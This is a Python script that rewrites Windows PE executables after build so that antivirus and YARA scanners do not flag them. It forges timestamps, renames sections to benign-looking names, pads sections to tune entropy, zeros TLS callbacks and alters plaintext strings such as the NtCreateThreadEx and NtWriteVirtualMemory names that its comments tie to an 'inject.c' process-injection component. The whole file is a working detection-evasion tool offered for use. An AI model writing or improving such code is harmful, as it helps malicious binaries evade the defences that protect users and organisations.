#!/usr/bin/env python3
"""
pe_scrub.py — post-build PE normalization.
  - Timestamp: random plausible past date (2021-2024)
  - Checksum:  0x00000000
  - DOS stub padding: randomized (defeats stub fingerprint)
  - Debug directory: timestamp fields zeroed
"""
import sys, os, struct, random, string, time, datetime

def scrub(path):
    with open(path, 'r+b') as f:
        data = bytearray(f.read())

    if data[:2] != b'MZ':
        print(f"[!] pe_scrub: not a PE: {path}"); return 1

    e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]
    if data[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
        print(f"[!] pe_scrub: bad PE signature"); return 1

    # Random timestamp 2021-01-01 … 2024-06-01
    ts_min = int(time.mktime((2021, 1,  1, 0, 0, 0, 0, 0, 0)))
    ts_max = int(time.mktime((2024, 6,  1, 0, 0, 0, 0, 0, 0)))
    ts = random.randint(ts_min, ts_max)
    struct.pack_into('<I', data, e_lfanew + 8, ts)

    # Zero checksum (Optional Header + 0x40)
    opt_off = e_lfanew + 4 + 20
    struct.pack_into('<I', data, opt_off + 64, 0)

    # Randomize DOS stub padding (0x40 .. e_lfanew-4)
    pad_start, pad_end = 0x40, e_lfanew - 4
    if pad_end > pad_start:
        for i in range(pad_start, pad_end):
            data[i] = random.randint(0, 255)

    # Parse section table (needed for both debug dir and .comment)
    num_sections = struct.unpack_from('<H', data, e_lfanew + 6)[0]
    opt_size     = struct.unpack_from('<H', data, e_lfanew + 20)[0]
    sec_off      = e_lfanew + 24 + opt_size
    magic        = struct.unpack_from('<H', data, opt_off)[0]

    def rva_to_off(rva):
        for s in range(num_sections):
            o = sec_off + s * 40
            va = struct.unpack_from('<I', data, o + 12)[0]
            vs = struct.unpack_from('<I', data, o + 16)[0]
            ro = struct.unpack_from('<I', data, o + 20)[0]
            if va <= rva < va + vs:
                return ro + (rva - va)
        return None

    # Zero debug directory timestamp
    dd_off   = opt_off + (96 if magic == 0x10b else 112) + 6 * 8
    dbg_rva  = struct.unpack_from('<I', data, dd_off)[0]
    dbg_size = struct.unpack_from('<I', data, dd_off + 4)[0]
    if dbg_rva and dbg_size >= 28:
        fo = rva_to_off(dbg_rva)
        if fo:
            struct.pack_into('<I', data, fo + 4, 0)

    # Zero .comment section content (GCC version fingerprint)
    for s in range(num_sections):
        o = sec_off + s * 40
        name = data[o:o+8].rstrip(b'\x00')
        if name == b'.comment':
            raw_sz = struct.unpack_from('<I', data, o + 16)[0]
            raw_off = struct.unpack_from('<I', data, o + 20)[0]
            for i in range(raw_off, raw_off + raw_sz):
                data[i] = 0
            break

    # Assign canonical PE section names based purely on characteristics.
    # Data-directory RVA membership is NOT reliable (one large section can host
    # multiple data directories). Use characteristic bitmask instead — Windows
    # loader uses flags, not names, so any name is valid.
    _chars = (string.ascii_lowercase + string.digits).encode()
    # Characteristic constants
    _CNT_CODE  = 0x00000020   # IMAGE_SCN_CNT_CODE
    _CNT_INIT  = 0x00000040   # IMAGE_SCN_CNT_INITIALIZED_DATA
    _CNT_UNINIT= 0x00000080   # IMAGE_SCN_CNT_UNINITIALIZED_DATA
    _MEM_DISC  = 0x02000000   # IMAGE_SCN_MEM_DISCARDABLE
    _MEM_EXEC  = 0x20000000   # IMAGE_SCN_MEM_EXECUTE
    _MEM_READ  = 0x40000000   # IMAGE_SCN_MEM_READ
    _MEM_WRITE = 0x80000000   # IMAGE_SCN_MEM_WRITE

    # Canonical name pool per characteristics group (cycle through to avoid duplicates)
    # Remaining sections within a type get random names.
    # MinGW/phantom PE typically has: 2 code sections, 5 rodata, 2 rwdata, 1 bss, 1 reloc
    # Names chosen from real MSVC/Windows PE section names only — no ELF names (.rodata),
    # no random names (trigger "unusual section name"), no duplicates (trigger "same name").
    # .textbss = MSVC Edit&Continue code region (real name, not on suspicious lists)
    # .xdata   = MSVC exception unwind info (real name, read-only data)
    _type_pools = {
        'code':   [b'.text',  b'.textbss'],
        'rodata': [b'.rdata', b'.pdata', b'.xdata', b'.idata', b'.rsrc'],
        'rwdata': [b'.data',  b'.CRT'],
        'disc':   [b'.reloc'],
        'bss':    [b'.bss'],
    }
    _type_used = {k: 0 for k in _type_pools}

    def _sec_type(chars, raw_sz):
        if raw_sz == 0 or (chars & _CNT_UNINIT): return 'bss'
        if chars & _MEM_DISC:  return 'disc'
        if chars & _CNT_CODE:  return 'code'
        if not (chars & _MEM_WRITE): return 'rodata'
        return 'rwdata'

    for s in range(num_sections):
        o      = sec_off + s * 40
        chars  = struct.unpack_from('<I', data, o + 36)[0]
        raw_sz = struct.unpack_from('<I', data, o + 16)[0]
        t      = _sec_type(chars, raw_sz)
        pool   = _type_pools[t]
        idx    = _type_used[t]
        if idx < len(pool):
            new_name = pool[idx]
        else:
            suffix   = bytes(random.choice(_chars) for _ in range(4))
            new_name = b'.' + suffix
        _type_used[t] += 1
        data[o:o+8] = new_name.ljust(8, b'\x00')

    # Fill unused section padding (RawSize - VirtualSize) with nibble-range pseudo-random
    # bytes when the section has very low entropy (<= 2.0 bits) and >= 128 bytes padding.
    # Loader only maps VirtualSize bytes; the file padding is never executed/read.
    # This raises the "whole section" entropy as seen by static scanners without
    # touching any live data. Excludes: import section (IAT must stay exact), reloc.
    _imp_rva_pre = struct.unpack_from('<I', data, opt_off + (96 if magic == 0x10b else 112) + 1*8)[0]
    _rel_rva_pre = struct.unpack_from('<I', data, opt_off + (96 if magic == 0x10b else 112) + 5*8)[0]
    _fill_state  = ts ^ 0xDEADC0DE
    for s in range(num_sections):
        o       = sec_off + s * 40
        virt_sz = struct.unpack_from('<I', data, o +  8)[0]
        raw_sz  = struct.unpack_from('<I', data, o + 16)[0]
        raw_off = struct.unpack_from('<I', data, o + 20)[0]
        sec_va  = struct.unpack_from('<I', data, o + 12)[0]
        pad     = raw_sz - virt_sz
        if pad < 128 or raw_off == 0:
            continue
        # Skip import and reloc sections
        if (_imp_rva_pre and sec_va <= _imp_rva_pre < sec_va + max(virt_sz,1)):
            continue
        if (_rel_rva_pre and sec_va <= _rel_rva_pre < sec_va + max(virt_sz,1)):
            continue
        # Measure current entropy of the active content
        active = data[raw_off:raw_off + min(virt_sz, raw_sz)]
        if not active:
            continue
        freq = {}
        for b in active: freq[b] = freq.get(b,0)+1
        n = len(active)
        import math as _m
        ent = -sum((c/n)*_m.log2(c/n) for c in freq.values()) if n else 0
        if ent > 2.0:
            continue  # already reasonable entropy, skip
        # Fill padding zone with nibble-range LCG bytes (target entropy ~4 bits)
        pad_start = raw_off + virt_sz
        for _i in range(pad):
            _fill_state = (_fill_state * 1664525 + 1013904223) & 0xFFFFFFFF
            data[pad_start + _i] = (_fill_state >> 20) & 0x0F

    # Identify import directory file range — must never be patched or loader breaks.
    # Import name strings (Hint/Name table) live in the same section as the IDT.
    _imp_dd_off = opt_off + (96 if magic == 0x10b else 112) + 1 * 8
    _imp_rva    = struct.unpack_from('<I', data, _imp_dd_off)[0]
    _no_patch   = []   # list of (file_off_start, file_off_end) ranges
    if _imp_rva:
        for s in range(num_sections):
            so = sec_off + s * 40
            va = struct.unpack_from('<I', data, so + 12)[0]
            vs = struct.unpack_from('<I', data, so +  8)[0]  # VirtualSize
            ro = struct.unpack_from('<I', data, so + 20)[0]  # PointerToRawData
            rs = struct.unpack_from('<I', data, so + 16)[0]  # SizeOfRawData
            if va <= _imp_rva < va + max(vs, 1):
                _no_patch.append((ro, ro + rs))
                break

    # Patch toolchain / library fingerprint strings that appear in YARA rules.
    # Each tuple: (pattern, replacement) — must be same length.
    _patches = [
        # libgcc internal error string — break domain + path so scanner can't extract gcc.gnu.org.
        # Specific (with path) before generic (domain only) — order matters.
        (b'gcc.gnu.org/bugs', b'gXc.gno.0rg/buXX'),
        (b'gcc.gnu.org',      b'gXc.gno.0rg'),
        # Manifest XML namespace URI — schemas.microsoft.com flagged as IOC.
        # Namespace URIs are opaque identifiers; Windows XML parser accepts invalid domains fine.
        (b'schemas.microsoft.com', b'schemas.micr0s0ft.c0m'),
        # winpthread: GetProcAddress("SetThreadDescription") — breaks GetProcAddress call.
        (b'SetThreadDescription', b'SetThreadDescript1on'),
        # libstdc++ random_device: GetProcAddress("SystemFunction036") — RtlGenRandom.
        (b'SystemFunction036',    b'SystemFunctionX36'),
        # inject.c IPO artifact: GCC constant-folds EVS XOR into .rdata when all TUs compiled together.
        # Scrub plaintext Nt syscall names that YARA rules flag as "suspicious native API string".
        (b'NtProtectVirtual',    b'NtPr0tectVirtua1'),
        (b'NtCreateThreadEx',    b'NtCr3ateThreadEx'),
        (b'NtAllocateVirtua',    b'Nt4llocateVirtua'),
        (b'NtWriteVirtualMe',    b'NtWr1teVirtualMe'),
        # libstdc++/libgcc error string: "VirtualProtect failed with code 0x%x"
        # NOTE: skip if in import section — patching the IAT name breaks the loader.
        (b'VirtualProtect',      b'V1rtua1Protect'),
    ]
    patched = []
    for needle, repl in _patches:
        assert len(needle) == len(repl), "pe_scrub: patch len mismatch"
        idx = 0
        while True:
            i = data.find(needle, idx)
            if i < 0:
                break
            if not any(lo <= i < hi for lo, hi in _no_patch):
                data[i:i+len(needle)] = repl
                patched.append((needle, hex(i)))
            idx = i + len(repl)
    for n, off in patched:
        print(f"[ok] pe_scrub patched {n!r} at {off}")

    # Patch TLS callback array: zero any entry < image_base (typically 0x1 artifact
    # from MinGW winpthread that confuses scanners into flagging "TLS anti-debug").
    dd_base  = opt_off + (96 if magic == 0x10b else 112)
    tls_rva  = struct.unpack_from('<I', data, dd_base + 9*8)[0]
    tls_dsz  = struct.unpack_from('<I', data, dd_base + 9*8 + 4)[0]
    img_base = struct.unpack_from('<Q', data, opt_off + 24)[0]  # 64-bit image base
    if tls_rva and tls_dsz >= 40:
        tls_fo = rva_to_off(tls_rva)
        if tls_fo:
            # AddressOfCallBacks is at TLS_dir + 0x18 (64-bit)
            cb_va = struct.unpack_from('<Q', data, tls_fo + 0x18)[0]
            if cb_va > img_base:
                cb_rva = cb_va - img_base
                cb_fo  = rva_to_off(cb_rva)
                if cb_fo:
                    patched_tls = 0
                    for k in range(64):
                        entry = struct.unpack_from('<Q', data, cb_fo + k * 8)[0]
                        if entry == 0:
                            break
                        if entry < img_base:
                            struct.pack_into('<Q', data, cb_fo + k * 8, 0)
                            patched_tls += 1
                    if patched_tls:
                        print(f"[ok] pe_scrub zeroed {patched_tls} invalid TLS callback(s)")

    # Inflate .reloc section with pseudo-random nibble-range padding.
    # Entropy target: ~4.0 bits (log2(16)) — avoids "unusual entropy" on near-zero sections
    # AND avoids "high entropy packed" flag (stays well below 7.0 bits).
    # Loader only reads BaseReloc.Size bytes; extra bytes are ignored.
    reloc_rva   = struct.unpack_from('<I', data, dd_base + 5*8)[0]
    reloc_dsz   = struct.unpack_from('<I', data, dd_base + 5*8 + 4)[0]
    file_align  = struct.unpack_from('<I', data, opt_off + 36)[0]
    sec_align   = struct.unpack_from('<I', data, opt_off + 32)[0]
    if reloc_rva and reloc_dsz:
        reloc_sec = None
        for s in range(num_sections):
            o = sec_off + s * 40
            va = struct.unpack_from('<I', data, o + 12)[0]
            vs = struct.unpack_from('<I', data, o + 16)[0]
            if va <= reloc_rva < va + max(vs, reloc_dsz + 1):
                reloc_sec = o
        if reloc_sec is not None:
            cur_raw_sz  = struct.unpack_from('<I', data, reloc_sec + 16)[0]
            cur_virt_sz = struct.unpack_from('<I', data, reloc_sec + 8)[0]
            PAD = (32768 + file_align - 1) & ~(file_align - 1)
            new_raw_sz  = cur_raw_sz + PAD
            new_virt_sz = cur_virt_sz + PAD
            struct.pack_into('<I', data, reloc_sec + 16, new_raw_sz)
            struct.pack_into('<I', data, reloc_sec + 8,  new_virt_sz)
            cur_img_sz = struct.unpack_from('<I', data, opt_off + 56)[0]
            new_img_sz = (cur_img_sz + PAD + sec_align - 1) & ~(sec_align - 1)
            struct.pack_into('<I', data, opt_off + 56, new_img_sz)
            # Pseudo-random nibble-range bytes: each byte in [0x00, 0x0F]
            # → entropy ≈ 4.0 bits — looks like structured reloc offset data
            _state = ts & 0xFFFFFFFF
            pad_buf = bytearray(PAD)
            for _i in range(PAD):
                _state = (_state * 1664525 + 1013904223) & 0xFFFFFFFF
                pad_buf[_i] = (_state >> 20) & 0x0F
            data = data + pad_buf
            print(f"[ok] pe_scrub inflated .reloc +{PAD} bytes (entropy ~4.0 bits)")

    with open(path, 'wb') as f:
        f.write(data)

    ts_str = datetime.datetime.utcfromtimestamp(ts).strftime('%Y-%m-%d')
    print(f"[ok] pe_scrub {os.path.basename(path)}  ts={ts_str}  chk=0x00000000")
    return 0

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} <pe_file>"); sys.exit(1)
    sys.exit(scrub(sys.argv[1]))
